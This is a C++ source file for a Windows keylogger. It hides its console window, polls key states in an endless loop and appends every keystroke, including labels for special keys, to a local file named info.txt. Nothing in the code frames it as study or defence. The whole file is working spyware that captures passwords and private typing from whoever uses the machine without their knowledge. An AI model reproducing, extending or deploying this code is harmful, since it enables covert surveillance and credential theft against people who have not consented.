#include <iostream>
#include <fstream>
#include <algorithm>
#include <iterator>  // Add this line
#include <windows.h>

//LOG FILE PATH
#define LOG_FILE "info.txt"

//SAVE DATA INTO THE LOG FILLE
void saveData(std::string data){
    std::fstream logFile;

    //OPENS FILE
    logFile.open(LOG_FILE, std::ios::app);

    // WRITES DATA TO FILE
    if (logFile.is_open()) {
        logFile << data;
        // CLOSES FILE STREAM
        logFile.close();
    } else {
        std::cerr << "Error opening the log file." << std::endl;
    }
}

std::string translateSpecialKey(int key) {
    std::string result;

    switch(key)
    {
        case VK_SPACE:
        result = " ";
        break;
        case VK_RETURN:
        result = "\n";
        break;
        case VK_BACK:
        result = "[BACKSPACE]";
        break;
        case VK_CAPITAL:
        result = "[CAPSLOCK]";
        break;
        case VK_SHIFT:
        result = "[SHIFT]";
        break;
        case VK_TAB:
        result = "[TAB]";
        break;
        case VK_CONTROL:
        result = "[CTRL]";
        break;
        case VK_MENU:
        result = "[ALT]";
        break;
        default:
        break;
    }

    return result;
}

int main() {
    int specialKeyArray[] = {VK_SPACE, VK_BACK, VK_RETURN, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
    const int numSpecialKeys = sizeof(specialKeyArray) / sizeof(specialKeyArray[0]);
	
    // HIDES TERMINAL WINDOW
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // LOOP FOREVER (Consider adding a way to exit the loop)
    while (true) {
        // LOOP THROUGH EACH KEY
        for (int key = 8; key <= 190; key++) {
            // CHECK IF KEY IS PRESSED
            if (GetAsyncKeyState(key) == -32767) {
                // KEY IS PRESSED
                // CHECK IF KEY IS SPECIAL KEY
                bool isSpecialKey = std::find(specialKeyArray, specialKeyArray + numSpecialKeys, key) != (specialKeyArray + numSpecialKeys);
                if (isSpecialKey) {
                    std::string specialKeyChar = translateSpecialKey(key);
                    saveData(specialKeyChar);
                } else {
                    saveData(std::string(1, (char)std::tolower(key)));
                }
            }
        }
    }
    

    return 0;
}
